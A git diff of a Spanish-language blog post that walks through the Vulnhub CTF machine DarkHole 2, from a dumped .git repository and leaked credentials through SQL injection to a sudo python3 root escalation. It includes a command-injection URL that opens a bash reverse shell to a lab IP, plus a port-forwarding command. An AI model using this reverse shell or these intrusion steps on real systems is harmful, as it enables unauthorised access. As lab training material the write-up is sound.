@@ -1,4 +1,22 @@
+---
+layout: single
+title: DarkHole 2 - Vulnhub
+excerpt: "Para resolver esta máquina nos dimos cuenta qué a la hora del escaneo con Nmap nos reportó que el repositorio .Git estaba expuesto, nos aprovechamos de esto para ver los commit's, en unos de los commits obtendríamos credenciales en texto claro para acceder en la página Web como el desarrollador Web, posterior a ello llevamos a cabo un SQLI basada en UNION para obtener credenciales SSH, una vez dentro podíamos ver el historial descubriendo así servicio web internos de los cuales abusamos para convertinos en usuario privilegiado."
+date: 11/11/2023
+classes: wide
+header:
+  teaser_home_page: true
+  icon: /assets/images/vulnhub.webp
 
+tags:
+  - Information Leakage
+  - GitHub Project Enumeration > creds
+  - SQLI
+  - ssh (Remote Port Forwarding)
+  - abusing Internal Web Server
+  - bash History - Information Leakage
+  - abusing sudoers
+---
 
 # PortScan
 ____
@@ -40,7 +58,7 @@ Vemos qué está expuesto el repositorio **Git**
 ___
 
 
-![[Pasted image 20231111125625.png]]
+![](/assets/images/vulnhub-writeup-darkhole2/Pasted image 20231111125625.png)
 
 
 No vemos nada sospechoso de primera, así qué procedemos a obtener el repositorio **Git** qué nos reportó el **Nmap** en local, con la herramienta [Git-Dumper](https://github.com/arthaud/git-dumper) para obtener lo qué parece ser el código fuente & ver sí podemos aprovecharnos de algo.
@@ -50,7 +68,7 @@ No vemos nada sospechoso de primera, así qué procedemos a obtener el repositor
 
 Teniendo así en local el repositorio .**GIT.**
 
-![[Pasted image 20231111130205.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111130205.png)
 Otra forma de obtener los recursos **.git** en local, es con "wget".
 ```bash
 wget -r http://192.168.204.160/.git/
@@ -62,7 +80,7 @@ Sí leemos el "**COMMIT_EDITMSG**" vemos qué se hizo un commit con nombre "**i 
 ```bash
 git log
 ```
-![[Pasted image 20231111131806.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111131806.png)
 Este commit tiene mala apariencia, porque aparentemente agregaron el login.php con las credentials default.
 
 2. Entramos al commit qué nos interesa.
@@ -70,14 +88,14 @@ Este commit tiene mala apariencia, porque aparentemente agregaron el login.php c
 git show a4d900a8d85e8938d3601f3cef113ee293028e10
 ```
 
-![[Pasted image 20231111131937.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111131937.png)
 
 Logrando ver así las credenciales default en texto claro.
 
 
 Probamos loguearnos con estas credenciales en el sitio web.
 
-![[Pasted image 20231111132127.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111132127.png)
 
 
 # SQL Injection
@@ -85,33 +103,33 @@ ____
 
 
 
-![[Pasted image 20231111132136.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111132136.png)
 
 Hemos entrado como el usuario **Jehad Alqurashi**, qué aparentemente es desarollador web.
 
 Buscando vulnerabilidades o de qué podríamos aprovecharnos de primera no encontré nada, pero fijandome en la **URL** ví qué probablemente sea vulnerable a **Inyecciones SQL**, así qué empiezo probando con un **sleep**.
-![[Pasted image 20231111132414.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111132414.png)
 
 Logrando así que dure 5 segundos en responder, esto confirmándonos que esta página es vulnerable a **Inyecciones SQL**, así que podríamos intentar ver credenciales de las base de datos de la página web.
 
 1. Identificamos el número de columnas
-![[Pasted image 20231111132945.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111132945.png)
 
 2. Vemos las bases de Datos existentes.
-![[Pasted image 20231111133102.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111133102.png)
 
 3. Ver tablas existente de la DB qué nos interesa.
-![[Pasted image 20231111133205.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111133205.png)
 
 4. Ver columnas de la tabla que nos interesa.
-![[Pasted image 20231111133410.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111133410.png)
 
 5. Ver contenido de las columnas qué nos interesan.
-![[Pasted image 20231111133551.png]]
+![](Pasted image 20231111133551.png)
 
 Obteniendo así lo qué parece ser credenciales para conectarnos a través de SSH.
 
-![[Pasted image 20231111133724.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111133724.png)
 ___
 
 
@@ -122,7 +140,7 @@ ____
 
 Indagando, descubrimos qué el historial no tiene un enlace simbólico al **"/dev/null"**, por lo qué podríamos tratar de ver sí contiene algo de lo que podrimos aprovecharnos.
 
-![[Pasted image 20231111134155.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111134155.png)
 
 Encontramos qué local de la máquina por el puerto **:9999** sé está usando un código para mediante los parámetros "**?cmd=**'" indicar qué comandos se quieren ejecutar.
 
@@ -132,7 +150,7 @@ ssh jehad@192.168.204.160 -L 9999:127.0.0.1:9999
 ```
 
 De forma qué entro al 9999 en local, y utilizó los parámetros que nos chivó el historial de Bash, ejecutando un "whoami"
-![[Pasted image 20231111141545.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111141545.png)
 
 Para mi sorpresa, el **RCE** lo ejecuta el usuario "**losy**", por lo qué se me ocurre migrar a este usuario mediante una **Reverse Shell,** esto a ver sí encontramos otra forma de migrar a ROOT.
 
@@ -140,7 +158,7 @@ Para mi sorpresa, el **RCE** lo ejecuta el usuario "**losy**", por lo qué se me
 http://localhost:9999/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.204.130/443 0>%261"
 ```
 
-![[Pasted image 20231111141841.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111141841.png)
 
 Ahora quedaría darle **Tratamiento a la TTY**, sino sabemos como te recomiendo [((CLICKEAR AQUÍ))](https://4uli.github.io/tratamiento-tty/)
 
@@ -152,11 +170,11 @@ ____
 
 Estando como "**Losy**", también podemos ver el historial de Bash, así qué echándole un ojo encontraríamos las credenciales de la misma **Losy**.
 
-![[Pasted image 20231111142208.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111142208.png)
 
 Por lo qué se me ocurre ver los permisos **SUDOERS**.
 
-![[Pasted image 20231111142324.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111142324.png)
 
 Encontraríamos que tenemos permisos **SUDOERS** como ROOT para python3, por lo qué podríamos aprovecharnos de esto para escalar nuestro privilegio.
 
@@ -166,4 +184,4 @@ sudo /usr/bin/python3
 ```
 
 2. Colocamos las siguientes líneas:
-![[Pasted image 20231111142707.png]]
+![](/assets/images/vulnhub-writeup-symfonos/Pasted image 20231111142707.png)
